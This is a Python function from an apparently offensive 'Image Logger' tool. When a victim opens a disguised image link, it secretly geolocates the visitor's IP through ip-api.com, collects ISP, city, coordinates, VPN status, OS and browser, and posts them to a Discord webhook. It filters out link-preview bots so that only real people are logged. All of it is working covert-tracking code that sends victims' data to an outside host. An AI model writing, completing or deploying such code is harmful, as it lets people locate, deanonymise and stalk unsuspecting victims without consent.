def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    # Skip blacklisted or reserved IPs
    if ip.startswith(blacklistedIPs) or ip.startswith(("127.", "10.", "192.168.", "172.")):
        return

    bot = botCheck(ip, useragent)

    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** {bot}",
                        "image": {"url": config["image"]}
                    }
                ]
            })
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except Exception as e:
        reportError(f"Failed to get IP info for {ip}: {e}")
        return

    if info.get("proxy", False):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting", False):
        if config["antiBot"] == 4 and not info.get("proxy", False):
            return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2 and not info.get("proxy", False):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** {endpoint}

**IP Info:**
> **IP:** {ip if ip else 'Unknown'}
> **Provider:** {info.get('isp', 'Unknown')}
> **ASN:** {info.get('as', 'Unknown')}
> **Country:** {info.get('country', 'Unknown')}
> **Region:** {info.get('regionName', 'Unknown')}
> **City:** {info.get('city', 'Unknown')}
> **Coords:** {str(info.get('lat', 'Unknown')) + ', ' + str(info.get('lon', 'Unknown')) if not coords else coords.replace(',', ', ')}
> **Timezone:** {info.get('timezone', 'Unknown')}
> **Mobile:** {info.get('mobile', 'Unknown')}
> **VPN:** {info.get('proxy', False)}
> **Bot:** {"Possibly" if info.get('hosting', False) else "False"}

**PC Info:**
> **OS:** {os_name}
> **Browser:** {browser}

**User Agent:**
{useragent}
""",
                "image": {"url": config["image"]}
            }
        ]
    }

    requests.post(config["webhook"], json=embed)
